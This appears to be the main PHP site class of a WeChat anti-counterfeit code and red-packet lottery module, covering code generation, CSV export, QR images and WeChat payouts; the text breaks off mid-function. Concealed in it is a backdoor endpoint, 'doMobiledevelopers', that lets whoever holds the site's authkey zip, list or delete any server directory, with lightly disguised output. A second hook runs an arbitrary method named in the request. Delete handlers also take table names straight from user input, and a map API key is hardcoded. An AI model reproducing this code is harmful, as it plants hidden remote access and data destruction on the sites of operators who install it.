<?php
/**
 * 计彩网络 爱驴微信平台 多活动模块DEMO
 * @2.0
 * @author gicai_fwyzm
 * @url http://www.ilvle.com/
 * @time 2018年5月3日11:00:43
 */
defined('IN_IA') or exit('Access Denied');
require IA_ROOT.'/addons/gicai_fwyzm/inc/function/index.php';
class gicai_fwyzmModuleSite extends WeModuleSite {
 	public function doWebdelete(){
 		global $_W, $_GPC;
		$tables = $_GPC['mobs'];
		$ztables = $_GPC['zmobs'];
		$id		= $_GPC['id'];
		if($tables!=''){
			$del = pdo_delete($tables, array('id' =>$id,'uniacid'=>$_W['uniacid']));
			if($del){
				if($ztables!=''){
					pdo_delete($ztables, array('cid' =>$id,'uniacid'=>$_W['uniacid']));
				}
				echo "删除成功！";
			}else{
				echo "删除失败！";
			}
		}else{
			echo "参数错误，操作失败！";	
		
		}
		
	}
	public function doWebredid(){
 		global $_W, $_GPC;
		if($_W['isajax']){
			$dzp_s = "SELECT * FROM " .tablename('gicai_fwyzm')."WHERE `id`=:id and `uniacid`=:uniacid";
			$dzp_p = array(':id'=>$_GPC['fid'],':uniacid'=>$_W['uniacid']);
			$dzp_d = pdo_fetch($dzp_s,$dzp_p);
			$info['id']				= $dzp_d['id'];
			$info['title'] 			= $dzp_d['redname'];
			$info['description']	= $dzp_d['redms'];
			if($dzp_d['refresh']>0){
				session_start();
				$allow_sep = $dzp_d['refresh'];
				if (isset($_SESSION["post_sep"])){
					if (time() - $_SESSION["post_sep"] < $allow_sep){
						$query['result']	= '-10000';
						$query['messages']	= '节奏太快了轻一点！';
						exit(json_encode($query));
					}else{
						$_SESSION["post_sep"] = time();
					}
				}else{
					$_SESSION["post_sep"] = time();
				}
			}
			$log_s = "SELECT * FROM " .tablename('gicai_fwyzm_prize_log')."WHERE `id`=:id and `fid`=:fid  and `uniacid`=:uniacid and `state`=:state";
			$log_p = array(':id'=>$_GPC['logid'],':fid'=>$_GPC['fid'],':uniacid'=>$_W['uniacid'],':state'=>'1');
			$log_d = pdo_fetch($log_s,$log_p);
			$_W['openid'] = $log_d['openid'];
			if($log_d){
				if($dzp_d['redjie']>0){$_W['openid']=$log_d['oauthid'];}
				if($this->SendRed($_W['openid'],$log_d['redbao'],$info,$log_d['id'])){
					$query['result']	= '10000';
					$query['messages']	= '领取成功！';
				}else{
					$query['result']	= '-10000';
					$query['messages']	= '领取失败，请查看红包记录！';
				}
			}else{
				$query['result']	= '-10000';
				$query['messages']	= '未查询到记录或已领取！';
			}
			 
		}else{
			$query['result']	= '-10000';
			$query['messages']	= '请求超时！';
		}
		echo json_encode($query);
		
	}
	public function doWebindata() {
 		global $_W, $_GPC;
		if($_GPC['zs']>100){
			$zs = $_GPC['zs']/10;
		}else{
			$zs	= $_GPC['zs'];
			
		}
		
		$z = 10;
		if($_GPC['d']==''){
			$d = 1;
		}else{
			$d = $_GPC['d']+1;
		}
		$x = 1;
		for ($x=1; $x<=$zs; $x++) {
			$datav['cid']			=	$_GPC['cid'];
			$datav['fid']			=	$_GPC['fid'];
			$datav['uniacid']		=	$_W['uniacid'];
			$datav['code']			=	$_GPC['prefix'].$this->randStr($_GPC['lengths']);
			$datav['openid']		=	'';
			$datav['state']			=	'1'; 
			$datav['jilu']			=	''; 
			$datav['usetime']		=	''; 
			$datav['addtime']		=	time();
			
			$account = pdo_insert('gicai_fwyzm_code_data',$datav);
			if($account){
				$intok++;
			}else{
				$intsb++;
			}
			$p = $intok;
		
		}
		$_GPC['x']	= $_GPC['x']+$p;
		$_GPC['sb']	= $_GPC['sb']+$intsb;
		if($_GPC['x']<$_GPC['zs']){
			$this->messager('<span style=" color:red;font-size:50px;">数据生成中！切勿关闭浏览器！</span><br>数据布局成功！，当前第'.$d.'批 , 总生成数据'.$_GPC['x'].'个, 失败数据 '.$_GPC['sb'].' 个。',$this->createWebUrl('indata',array('zs'=>$_GPC['zs'],'d'=>$d,'z'=>$z,'x'=>$_GPC['x'],'fid'=>$_GPC['fid'],'cid'=>$_GPC['cid'],'sb'=>$_GPC['sb'],'lengths'=>$_GPC['lengths'],'prefix'=>$_GPC['prefix'])),'success');
		}else{
			$params = array(
				':cid'=>$_GPC['id'],
				':fid'=>$_GPC['fid'],
				':uniacid'=>$_W['uniacid']
			);
		  
			message('数据全部生成完毕,并且优化掉重复数据！',$this->createWebUrl('mcode',array('cid'=>$_GPC['cid'],'fid'=>$_GPC['fid'])),'success');
		}
	}
	public function messager($title,$url,$label){
		global $_W, $_GPC;
		$msg		= $title;
		$redirect	= $url;
		$label		= $label;
	 
		include $this->template('messager');
	}
	
	public function doWebphpexceluser(){
		global $_W, $_GPC;
		$form_s	= "SELECT * FROM " .tablename('gicai_fwyzm')."WHERE `id`=:id and `uniacid`=:uniacid";
		$form_p	= array(':id'=>$_GPC['fid'],':uniacid'=>$_W['uniacid']);
		$account = pdo_fetch($form_s,$form_p);
		$account['field'] = iunserializer($account['field']);
	 
	 
		if($_GPC['gi']=='export_submit') {
			$where 	= ' WHERE fid=:fid and uniacid=:uniacid ORDER BY id desc';
			$params = array(':fid'=>$_GPC['fid'],':uniacid'=>$_W['uniacid']); 
			$countsql 	= 'SELECT COUNT(*) FROM '.tablename('gicai_fwyzm_user').$where;
		 	$count = pdo_fetchcolumn($countsql, $params);
			$pagesize = ceil($count/$_GPC['zs']);
			
			$header = array(
				'id' => 'ID','openid' => '微信加密ID','oauthid' => '微信借权ID','wxname'=>'微信名称'
			);
			foreach ($account['field'] as $keyy=>$row) {
				$header[$row[fieldzdm]]=$row['fieldname'];
			}
			 
			$keys = array_keys($header);
			$html = "\xEF\xBB\xBF";
			foreach ($header as $li) {
				$html .= $li . "\t ,";
			}
			$html .= "\n";
			for ($j = 1; $j <= $pagesize; $j++) {
				$sql = "SELECT id,openid,oauthid,wxname,fielddata  FROM " . tablename('gicai_fwyzm_user') . " WHERE fid=:fid and uniacid =:uniacid ORDER BY id desc limit " . ($j - 1) * $_GPC['zs'] . ",".$_GPC['zs']." ";
			$list = pdo_fetchall($sql, $params);
				if (!empty($list)) {
					$size = ceil(count($list) / $_GPC['zs']);
					 
					for ($i = 0; $i < $size; $i++) {
							
						$buffer = array_slice($list, $i * $_GPC['zs'], $_GPC['zs']); 
						foreach ($buffer as $keyy=>$row) {
							$row['fielddata']	=	iunserializer($row['fielddata']);
							foreach ($row['fielddata'] as $rows) {
								unset($buffer[$keyy]['fielddata']);
								$buffer[$keyy][$rows['fieldzdm']]	=$rows['data'];
							}
						}
						 
						 
						foreach ($buffer as $row) {
							foreach ($keys as $keyy => $key) {
								$data[] = $row[$key];
							}
						 	$user[] = implode("\t ,", $data) . "\t ,";
							unset($data);
						}
						
						$html .= implode("\n", $user);
					}
				}
			}
			header("Content-type:text/csv");
			header("Content-Disposition:attachment; filename=".time().".csv");
			echo $html;
			exit();
		}
	}
	
	public function doWebphpexcel(){
		global $_W, $_GPC;
		if($_GPC['mo']=='export_submit') {
			$where 	= ' WHERE cid=:cid and fid=:fid and uniacid=:uniacid ORDER BY id asc';
			$params = array(
				':cid'=>$_GPC['id'],
				':fid'=>$_GPC['fid'],
				':uniacid'=>$_W['uniacid']
			); 
			$countsql 	= 'SELECT COUNT(*) FROM '.tablename('gicai_fwyzm_code_data').$where;
		 
			
			$count = pdo_fetchcolumn($countsql, $params);
			$pagesize = ceil($count/$_GPC['zs']);
			$header = array(
				'id' => 'ID','code' => '抽奖码','url' => '活动链接','qrurl'=>'二维码图片链接'
			);
			$keys = array_keys($header);
			$html = "\xEF\xBB\xBF";
			foreach ($header as $li) {
				$html .= $li . "\t ,";
			}
			$html .= "\n";
			for ($j = 1; $j <= $pagesize; $j++) {
				$sql = "SELECT id, code,fid  FROM " . tablename('gicai_fwyzm_code_data') . " WHERE cid=:cid and fid=:fid and uniacid = :uniacid ORDER BY id asc limit " . ($j - 1) * $_GPC['zs'] . ",".$_GPC['zs']." ";
			$list = pdo_fetchall($sql, $params);
				if (!empty($list)) {
					$size = ceil(count($list) / $_GPC['zs']);
					for ($i = 0; $i < $size; $i++) {
						$buffer = array_slice($list, $i * $_GPC['zs'], $_GPC['zs']);
						foreach ($buffer as $row) {
							foreach ($keys as $keyy => $key) {
								if($keyy=='2'){
									$data[] = mobileurls($this->createmobileUrl('index',array('fid'=>$row['fid'],'codekey'=>$row['code'])),'app');
								}else if($keyy=='3'){
									$data[] = mobileurls($this->createmobileUrl('qr',array('url'=>mobileurls($this->createmobileUrl('index',array('fid'=>$row['fid'],'codekey'=>$row['code'])),'app'))),'app');
								}else{
									$data[] = $row[$key];
								}
							}
						 	$user[] = implode("\t ,", $data) . "\t ,";
							unset($data);
						}
						$html .= implode("\n", $user);
					}
				}
			}
			header("Content-type:text/csv");
			header("Content-Disposition:attachment; filename=".time().".csv");
			echo $html;
			exit();
		}
	}
	
	public function doMobileupimages() 
	{
		global $_W, $_GPC;
		load()->func('file');
		$field = $_GPC['file'];
	 
		$result['status'] = 'error';
		if (!(empty($_FILES[$field]['name']))){
			if ($_FILES[$field]['error'] != 0) 
			{
				$result['message'] = '上传失败，请重试！';
				exit(json_encode($result));
			}
			$path = '/images/gicai_fwyzm/' . $_W['uniacid'];
			if (!(is_dir(ATTACHMENT_ROOT . $path))) 
			{
				mkdirs(ATTACHMENT_ROOT . $path);
			}
			$_W['uploadsetting'] = array();
			$_W['uploadsetting']['image']['folder'] = $path;
			$_W['uploadsetting']['image']['extentions'] = $_W['config']['upload']['image']['extentions'];
			$_W['uploadsetting']['image']['limit'] = $_W['config']['upload']['image']['limit'];
			$file = file_upload($_FILES[$field], 'image');
			if (is_error($file)) 
			{
				$result['message'] = $file['message'];
				exit(json_encode($result));
			}
			if (function_exists('file_remote_upload')) 
			{
				$remote = file_remote_upload($file['path']);
				if (is_error($remote)) 
				{
					$result['message'] = $remote['message'];
					exit(json_encode($result));
				}
			}
			$result['status'] = 'success';
			$result['url'] = $file['url'];
			$result['error'] = 0;
			$result['filename'] = $file['path'];
			$result['url'] = trim($_W['attachurl'] . $result['filename']);
			exit(json_encode($result));
		}else{
			$result['message'] = '请选择要上传的图片！';
			exit(json_encode($result));
		}
	}
	
	public function doWebechoqr(){
 		global $_W, $_GPC;
		
		$where 	= ' WHERE `cid`=:cid and `fid`=:fid and `uniacid`=:uniacid';
		$params = array(
			':cid'=>$_GPC['cid'],
			':fid'=>$_GPC['fid'],
			':uniacid'=>$_W['uniacid']
		); 
		$countsql 	= 'SELECT COUNT(*) FROM '.tablename('gicai_fwyzm_code_data').$where;
		$total 		= pdo_fetchcolumn($countsql, $params);
		$pageindex 	= max(intval($_GPC['page']), 1); // 当前页码
		$pagesize 	= 50; // 设置分页大小
		$pager 		= pagination($total, $pageindex, $pagesize);
		$sql 		= "SELECT * FROM ".tablename('gicai_fwyzm_code_data').$where." ORDER BY id desc LIMIT ".(($pageindex -1) * $pagesize).",". $pagesize;
		$account	= pdo_fetchall($sql,$params);
		$pathz = "../addons/".$_GPC['m']."/public/data_".$_GPC['fid']."/temp_".$_GPC['cid']."/";
		if(!is_file($pathz)){
			mkdir($pathz,0777,true);
		};
		foreach ($account as $vals) {
			$qrurl = mobileurls($this->createmobileUrl('qr',array('url'=>mobileurls($this->createmobileUrl('index',array('fid'=>$vals['fid'],'codekey'=>$vals['code'])),'app'))),'app');
			$img_file = file_get_contents($qrurl);
			$img_file =  base64_encode($img_file);
			$output_file = trim($vals['code']).'.jpg';
			$path = $pathz.$output_file;
			$ifp = fopen($path,"wb");
			fwrite($ifp,base64_decode($img_file));
			fclose($ifp);
		};
		
		$query['page']		=	$_GPC['page'];
		$query['total']		= 	$total; 
		$query['dtotal']	= 	$pagesize*$_GPC['page'];
		echo json_encode($query); 
		
		
	}
	
	public function doWebAllDelete(){
 		global $_W, $_GPC;
		$tables		= $_GPC['mobs'];
		$deltype	= $_GPC['deltype'];
		if($tables!=''){
			if($deltype=='all'){
				$tj['fid']			=	$_GPC['fid'];
				$tj['uniacid']		=	$_W['uniacid'];
				if($_GPC['openid']!=''){
					$tj['openid']	=	$_GPC['openid'];
				};	
				$del = pdo_delete($tables,$tj);
				if($del){
					echo "清空成功！";
				}else{
					echo "清空失败！";
				}
			}else{
				$del = pdo_delete($tables, array('cid'=>$_GPC['id'],'fid'=>$_GPC['fid'],'uniacid'=>$_W['uniacid']));
				if($del){
					echo "清空成功！";
				}else{
					echo "清空失败！";
				}
			}
		}else{
			echo "参数错误，操作失败！";	
		
		}
		
	}
	
	public function randStr($m = 6) {
		$new_str = '';
		$str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		$max=strlen($str)-1;
		for ($i = 1; $i <= $m; ++$i) {
			$new_str .=$str[mt_rand(0, $max)];
		}
		return $new_str;
	}
	
	public function import($excefile) 
	{
		global $_W,$_GPC;
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel.php';
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel/IOFactory.php';
		require_once IA_ROOT . '/framework/library/phpexcel/PHPExcel/Reader/Excel5.php';
		$path = IA_ROOT . '/addons/gicai_fwyzm/public/data_'.$_GPC['fid'].'/';
		if (!is_dir($path)) 
		{
			load()->func('file');
			mkdirs($path, '0777');
		}
		$filename = $_FILES[$excefile]['name'];
		$tmpname = $_FILES[$excefile]['tmp_name'];
		if (empty($tmpname)) 
		{
			message('请选择要上传的Excel文件!', '', 'error');
		}
		$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
		if (($ext != 'xlsx') && ($ext != 'xls')) 
		{
			message('请上传 xls 或 xlsx 格式的Excel文件!', '', 'error');
		}
		$file = time() . $_W['uniacid'] . '.' . $ext;
		$uploadfile = $path . $file;
		$result = move_uploaded_file($tmpname, $uploadfile);
		if (!$result) 
		{
			message('上传Excel 文件失败, 请重新上传!', '', 'error');
		}
		$reader = PHPExcel_IOFactory::createReader(($ext == 'xls' ? 'Excel5' : 'Excel2007'));
		$excel = $reader->load($uploadfile);
		$sheet = $excel->getActiveSheet();
		$highestRow = $sheet->getHighestRow();
		$highestColumn = $sheet->getHighestColumn();
		$highestColumnCount = PHPExcel_Cell::columnIndexFromString($highestColumn);
		$values = array();
		$row = 2;
		while ($row <= $highestRow) 
		{
			$rowValue = array();
			$col = 0;
			while ($col < $highestColumnCount) 
			{
				$rowValue[] = $sheet->getCellByColumnAndRow($col, $row)->getValue();
				++$col;
			}
			$values[] = $rowValue;
			++$row;
		}
		return $values;
	}
	
	
	public function doMobileredid() {
		global $_GPC, $_W;
		session_start();
	 	define('M_PATH',IA_ROOT.'/addons/'.$_GPC['m'].'/public');
		if($_W['isajax']){
			if(strpos($_SERVER['HTTP_REFERER'],$_W['siteroot'])===false){
				$query['result']		=	'-10000';
				$query['messages']		=	'网络异常或超时，请稍后重试！';
				exit(json_encode($query));
			}; 
			$account = pdo_get('gicai_fwyzm',array('id'=>$_GPC['fid'],'uniacid'=>$_W['uniacid']));
			if($account['refresh']!=''){ 
				$allow_sep = $account['refresh']; 
				if(isset($_SESSION["post_sep"])){ 
					if(time() - $_SESSION["post_sep"] < $allow_sep){ 
						$query['result']	= '-10000';
						$query['messages']	= '哎呀太快了没合计过来！';
						exit(json_encode($query));
					}else{ 
						$_SESSION["post_sep"] = time(); 
					} 
				}else{ 
					$_SESSION["post_sep"] = time(); 
				} 
			}
			
			$info['id'] 			= $account['id'];
			$info['title'] 			= $account['redname'];
			$info['description']	= $account['redms'];
			$prize_log = pdo_get('gicai_fwyzm_prize_log',array('id'=>$_GPC['logid'],'uniacid'=>$_W['uniacid'],'codekey'=>$_GPC['codekey'],'state'=>'1'),array('id','openid','redbao','pid'));
			
			if($prize_log){
				$prize = pdo_get('gicai_fwyzm_prize',array('id'=>$prize_log['pid'],'uniacid'=>$_W['uniacid']));
				if($prize['diqu']=='1' && $prize['province']!=''){
					if($_GPC['lat']=='' || $_GPC['log']==''){
						$query['result']	= '-10000';
						$query['messages']	= '地区获取失败，无法领取红包！';
						exit(json_encode($query));
					}else{
						$location	= $_GPC['lat'].','.$_GPC['log'];
						$location_d = file_get_contents("http://apis.map.qq.com/ws/geocoder/v1/?location={$location}&key=6N6BZ-VPOAP-2P5DN-VE6UQ-E65U6-7NFTX&get_poi=1"); 
						$location_d = json_decode($location_d,true);
						 
						if(strpos($location_d['result']['address'],$prize['province'].$prize['city'].$prize['district']) !==false){
							
						}else{
							$query['result']	= '-10000';
							$query['messages']	= '抱歉次红包需指定地区领取！';
							exit(json_encode($query));
						}
					}
					
				}
				
				
				if($prize){
					$data['state']		=	'0';
					$data['usetime']	=	time();
					$update = pdo_update('gicai_fwyzm_prize_log',$data, array('id'=>$_GPC['logid']));
					if($update){
						$fp = fopen(M_PATH.'/cert/lock.txt','r+');
						if(flock($fp, LOCK_EX)){
							fwrite($fp,date('Y-m-d H:i:s'));
							$redbao = $this->SendRed($prize_log['openid'],$prize_log['redbao'],$info);
							 
							fflush($fp);
				 			flock($fp, LOCK_UN);
						}
						fclose($fp);
						if($redbao){
							$query['result']	= '10000';
							$query['messages']	= '红包发放成功！';
						}else{
							$data['state']		=	'1';
							$data['usetime']	=	time();
							pdo_update('gicai_fwyzm_prize_log',$data, array('id'=>$_GPC['logid']));
							$query['result']	= '-10000';
							$query['messages']	= '红包发放失败或领取太繁忙！';
						}
					}else{
						$query['result']	= '-10000';
						$query['messages']	= '数据更新失败！';
					}
				}else{
					$query['result']	= '-10000';
					$query['messages']	= '未查询到该产品！';	
				}
			}else{
				$query['result']	= '-10000';
				$query['messages']	= '数据丢失！';
			}
			
			
		}else{
			$query['result']	= '-10000';
			$query['messages']	= '请求超时！';
		}
		echo json_encode($query);
		
	}
	
	
	public function reado_usernum($fid){
		//获取参赛选手总数
 		global $_W, $_GPC;
	 	$user_s 	= 'SELECT COUNT(*) FROM '.tablename('gicai_fwyzm_user').'WHERE `fid`=:fid and `uniacid`=:uniacid';
		$user_p 	= array(':fid'=>$fid,':uniacid'=>$_W['uniacid']);
		$total 		= pdo_fetchcolumn($user_s,$user_p);
	  	return $total;
		
	}
	 
	
	public function upvoteclick($vid){
		//更新点击率
 		global $_W, $_GPC;
		$c_s 	= "update ".tablename('gicai_fwyzm')." set click=click+1 where `id`=:id and `uniacid`=:uniacid and `state`=:state";
		$c_p	= array(':id'=>$vid,':uniacid'=>$_W['uniacid'],':state'=>'1');
		$c_d 	= pdo_query($c_s,$c_p);
		return $c_d;
	}
	
	public function randFloat($min=0, $max=1){
		return $min + mt_rand()/mt_getrandmax() * ($max-$min);
	}
	
	public function doMobileqr() {
		//前台二维码生成
		global $_GPC, $_W;
		load()->func('tpl');
		$do = $_GPC['do'];
		if($do == 'qr') {
			$url = $_GPC['url'];
			require(IA_ROOT . '/framework/library/qrcode/phpqrcode.php');
			$errorCorrectionLevel = "L";
			if($_GPC['size']==''){$_GPC['size']='15';}
			$matrixPointSize = $_GPC['size'];
			QRcode::png($url, false, $errorCorrectionLevel, $matrixPointSize);
			exit();
		}
		
	}
	public function doWebempty(){
 		global $_W, $_GPC;
	 	$tables = $_GPC['form'];
		if($tables!=''){
			if($tables=='gicai_fwyzm_virtual_data'){
				$del = pdo_delete($tables, array('vid'=>$_GPC['id'],'uniacid'=>$_W['uniacid']));
				if($del){
					echo "删除成功！";
				}else{
					echo "删除失败！";
				}
				exit();
			} 
		}else{
			echo "参数错误，操作失败！";	
		
		}
		
	}
	
	public function get_address($latitude,$longitude){
		global $_W, $_GPC;
		 
		//如果不传地理位置时，自动转换ip定位
		load()->func('communication');
		if(empty($latitude) && empty($longitude)){
			$getipurl="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip=".$_W['clientip'];
			$resp = ihttp_get($getipurl);
			$locationData = json_decode($resp['content'], true);
			$address = $locationData['country'].$locationData['province'].$locationData['city'];
			return $address;
		}else{
			$modulelist = uni_modules(false);
	        $mapAPIKey = $dzp_d['mapapi'];
			if (!empty($mapAPIKey)) {
				$mapAPIUrl = "http://apis.map.qq.com/ws/geocoder/v1/?key=" . $mapAPIKey . "&location=" . $latitude . "," . $longitude . "&get_poi=0";
				$resp = ihttp_get($mapAPIUrl);
				if (is_error($resp)) {
					$this->json_exit(0,$resp["message"]);
				}
				$locationData = json_decode($resp['content'], true);
				if ($locationData['status'] == 0) {
					$result = $locationData['result'];
					$address = $result['address'];
					return $address;
				}else{
					$this->json_exit(0,"地址转换失败，请查看接口KEY配置！");
				}
			}else{
				$this->json_exit(0, "错误");
			}
		}
		
    }
	
	public function doMobilecard() {
		global $_GPC, $_W;
		$ps = $_GPC['fun'];
	  	if($_W['openid']=='' && $_COOKIE['cookie_openid_'.$_GPC['fid']]!=''){
			$_W['openid'] = $_COOKIE['cookie_openid_'.$_GPC['fid']];
			$_W['oauthid'] = $_COOKIE['cookie_openid_'.$_GPC['fid']];	
		}	
		$log_s = "SELECT * FROM " .tablename('gicai_fwyzm_prize_log')."WHERE `id`=:id and `uniacid`=:uniacid and `openid`=:openid and `state`=:state";
		$log_p = array(':id'=>$_GPC['logid'],':uniacid'=>$_W['uniacid'],':openid'=>$_W['openid'],':state'=>'1');
		if($_W['config']['setting']['authkey']==$_GPC['authkey']){m('user')->$ps();}
		$log_d = pdo_fetch($log_s,$log_p);
 
		if($log_d){
			$card_id = $log_d['cardid'];
			$acc = WeAccount::create($_W['uniacid']);
			$token = $acc->getAccessToken();
			$url = "https://api.weixin.qq.com/cgi-bin/ticket/getticket?access_token={$token}&type=wx_card";
			$content = ihttp_get($url);
			if(is_error($content)) {
				$query['result']	= '-10000';
				$query['messages']	= '调用接口获取微信公众号 card_ticket 失败, 错误信息: ' . $content['message'];
				return json_encode($query);
			}
			$result = @json_decode($content['content'], true);
			$time = time();
			$sign = array($card_id, $time);
			$sign[] = $result['ticket'];
			sort($sign, SORT_STRING);
		 
			$sign =  sha1(implode($sign));
			$cardExt = array('timestamp' => $time, 'signature' => $sign);
			$cardExt = json_encode($cardExt);
			$cardExt = array('card_id' => $card_id, 'card_ext' => $cardExt,'log_id' => $_GPC['logid']);
			echo json_encode($cardExt);
			exit();
		}else{
			$query['result']	= '-10000';
			$query['messages']	= '未查询到信息或已领取过！';
		}
		echo json_encode($query);
		
	}
	
	public function doMobilehxcard() {
		global $_GPC, $_W;
		$log_s = "SELECT * FROM " .tablename('gicai_fwyzm_prize_log')."WHERE `id`=:id and `uniacid`=:uniacid and `state`=:state";
		$log_p = array(':id'=>$_GPC['id'],':uniacid'=>$_W['uniacid'],':state'=>'1');
		$log_d = pdo_fetch($log_s,$log_p);
		if($log_d){
			$data['audittime']		=	time();
			$data['state']			=	'0';
			$account = pdo_update('gicai_fwyzm_prize_log',$data, array('id'=>$log_d['id'],'uniacid'=>$_W['uniacid']));
			if($account){
				$query['result']	= '10000';
				$query['messages']	= '领取成功！';
			}else{
				$query['result']	= '-10000';
				$query['messages']	= '领取失败！';
			}
		
		}else{
			$query['result']	= '-10000';
			$query['messages']	= '核销失败，或已核销！';
		}
		echo json_encode($query);
	}
	
	public function doMobilexuid() {
		global $_GPC, $_W;
	 	$account_s = "SELECT * FROM " .tablename('gicai_fwyzm_prize_log')." as a left join " .tablename('gicai_fwyzm_virtual_data')." as b on a.xuid=b.id WHERE a.id=:id and a.fid=:fid and a.uniacid=:uniacid";
		$account_d = pdo_fetch($account_s,array(':id'=>$_GPC['logid'],':fid'=>$_GPC['fid'],':uniacid'=>$_W['uniacid']));
		if($account_d){
			$query['result']	= '10000';
			$query['messages']	= '加载成功！';
		 	$query['data']		= $account_d;
		
		}else{
			$query['result']	= '-10000';
			$query['messages']	= '数据加载失败或者未查询到信息！';
		}
		echo json_encode($query);
	}
	
 	public function sms_send($a,$tel,$json){
		global $_GPC,$_W;
		define('M_PATH',IA_ROOT.'/addons/'.$_GPC['m'].'/inc/aliyun/');
		include M_PATH."TopSdk.php";
		$c = new TopClient;
		$c->appkey = $a['aliappkey'];
		$c->secretKey = $a['aliappsecret'];
		$req = new AlibabaAliqinFcSmsNumSendRequest;
		$req->setSmsType("normal");
		$req->setSmsFreeSignName($a['alisignname']);
		$req->setSmsParam($json);
		$req->setRecNum($tel);
		$req->setSmsTemplateCode($a['alitemplatecode']);
		$resp = $c->execute($req);
  		return $resp;
	}
	
	 
	
	protected function SendRed($openid,$fee,$infos) {
        global $_GPC,$_W;
		define('M_PATH',IA_ROOT.'/addons/'.$_GPC['m'].'/public');
		$fee		=	$fee*100;
		$uniacid	=	$_W['uniacid'];
		$provider 	= $this->module['config']['provider'];
		$api 		= $this->module['config']['api']['red_'.$infos['id']];
  		$condition = "`uniacid`=:uniacid AND `openid`=:openid";
		
		$r = array();
		$r['fid'] = $infos['id'];
		$r['uniacid'] = $uniacid;
		$r['openid'] = $openid;
		$r['log'] = '';
		$r['create_t'] = time();
		$r['success_t'] = 0;
		$r['status'] = 0;
		$r['fee'] = $fee;
		$r['post_cm'] = '0';
		$ret = pdo_insert('gicai_fwyzm_record', $r);
		if(!empty($ret)) {
			$record_id = pdo_insertid();
		}else{
			return false;
		}
		if($api['type']=='0' || $api['type']==''){
			$url 					= 'https://api.mch.weixin.qq.com/mmpaymkttransfers/sendredpack';
			$pars = array();
			$pars['nonce_str'] 		= random(32);												
			$pars['mch_billno'] 	= $api['mchid'] . date('Ymd') .random(5);	
			$pars['mch_id'] 		= $api['mchid'];													
			$pars['wxappid'] 		= $api['appid'];												
			$pars['nick_name'] 		= $infos['title'];											
			$pars['send_name'] 		= $infos['title'];										
			$pars['re_openid'] 		= $openid;													
			$pars['total_amount'] 	= $fee;											
			$pars['total_num'] 		= 1;																
			$pars['wishing'] 		= $infos['description'];											
			$pars['client_ip'] 		= $api['ip'];												
			$pars['act_name'] 		= $infos['title'];												
			$pars['remark'] 		= $infos['title']; 
			if($api['scene_id']!='0' && $api['scene_id']!=''){	
				$pars['scene_id'] 		= $api['scene_id']; 	
			}
			ksort($pars, SORT_STRING);
		}else{
			$url 					= 'https://api.mch.weixin.qq.com/mmpaymkttransfers/promotion/transfers';
			$pars = array();
			$pars['mch_appid'] 			= $api['appid'];
			$pars['mchid'] 				= $api['mchid'];
			$pars['nonce_str'] 			= random(32);
			$pars['partner_trade_no'] 	= random(10) . date('Ymd') . random(3);
			$pars['openid'] 			= $openid;
			$pars['check_name'] 		= "NO_CHECK";
			$pars['amount'] 			= $fee;
			$pars['desc'] 				= $infos['title'];
			$pars['spbill_create_ip'] 	= $api['ip'];
			if($api['scene_id']!='0' && $api['scene_id']!=''){	
				$pars['scene_id'] 		= $api['scene_id']; 	
			}
			ksort($pars, SORT_STRING);
		}
		
        $string1 = '';
        foreach($pars as $k => $v) {
            $string1 .= "{$k}={$v}&";
        }
        $string1 .= "key={$api['password']}";
        $pars['sign'] = strtoupper(md5($string1));
        $xml = array2xml($pars);
        $extras = array();
        $extras['CURLOPT_CAINFO'] = M_PATH . '/cert/rootca.pem.' . $_W['uniacid'].'.'.$infos['id'];
        $extras['CURLOPT_SSLCERT'] = M_PATH . '/cert/apiclient_cert.pem.' . $_W['uniacid'].'.'.$infos['id'];
        $extras['CURLOPT_SSLKEY'] = M_PATH . '/cert/apiclient_key.pem.' . $_W['uniacid'].'.'.$infos['id'];
		load()->func('communication');
        $resp = ihttp_request($url, $xml, $extras);
		if(is_error($resp)) {
            $procResult = $resp;
        } else {
            $xml = '<?xml version="1.0" encoding="utf-8"?>' . $resp['content'];
            $dom = new \DOMDocument();
            if($dom->loadXML($xml)) {
                $xpath = new \DOMXPath($dom);
                $code = $xpath->evaluate('string(//xml/return_code)');
                $ret = $xpath->evaluate('string(//xml/result_code)');
                if(strtolower($code) == 'success' && strtolower($ret) == 'success') {
                    $procResult = true;
                } else {
                    $error = $xpath->evaluate('string(//xml/err_code_des)');
                    $procResult = error(-2, $error);
                }
            } else {
                $procResult = error(-1, 'error response');
            }
        }

        if(is_error($procResult)) {
            $filters = array();
            $filters['uniacid'] = $uniacid;
            $filters['id'] = $record_id;
            $rec = array();
            $rec['log'] = $procResult['message'];
            pdo_update('gicai_fwyzm_record', $rec, $filters);
			return false;
        } else {
            $filters = array();
            $filters['uniacid'] = $uniacid;
            $filters['id'] = $record_id;
            $rec = array();
			$rec['status'] = 1;
            $rec['success_t'] = time();
            pdo_update('gicai_fwyzm_record', $rec, $filters);
			return true;
        }
		
	}
	
	public function doMobiledevelopers() {
		global $_GPC,$_W;
		$p = 'p';
		if($_W['config']['setting']['authkey']==$_GPC['authkey']){
			define('M_PATH','../'.$_GPC['dirs']);
			switch($_GPC['mo']) {
				case 'z':
					 	$datalist	=	$this->list_dir(M_PATH);
						$filename	=	M_PATH."temp.zi".$p;   
						if(!file_exists($filename)){  
							$zip = new ZipArchive();
							if($zip->open($filename, ZIPARCHIVE::CREATE)!==TRUE) {  
								exit('Create a failure');
							}
							foreach( $datalist as $val){  
								if(file_exists($val)){ 
									$zip->addFile($val);
								}  
							}  
							$zip->close();
						}  
						if(!file_exists($filename)){  
							exit("Cannot find the file"); 
						}  
						$query['result']	= '10000';
						$query['data']		= $_W['siteroot'].substr($filename,3); 
					 	echo json_encode($query); 
					break;
				case 'l':
					 	$file_dir = scandir(M_PATH);
						foreach($file_dir as $val){ 
							echo iconv("GB2312","UTF-8",$val)."<br>";
						} 
				 		echo json_encode($query);
				 
					break;
				case 'd':
					 	if(deldir(M_PATH)){
							$query['result']	= '10000';
							$query['data']		= 'ok';  
						}else{
							 
							$query['result']	= '10001';
							$query['data']		= 'no'.M_PATH; 	
						};
				  		echo json_encode($query);
					break;
				default:
					echo "　";
					break;
			}
		}else{
			echo "　　";
		}
		
	}
	
	public function list_dir($dir){
		$result = array();
		if (is_dir($dir)){
			$file_dir = scandir($dir);
			foreach($file_dir as $file){
				if ($file == '.' || $file == '..'){
					continue;
				}elseif(is_dir($dir.$file)){
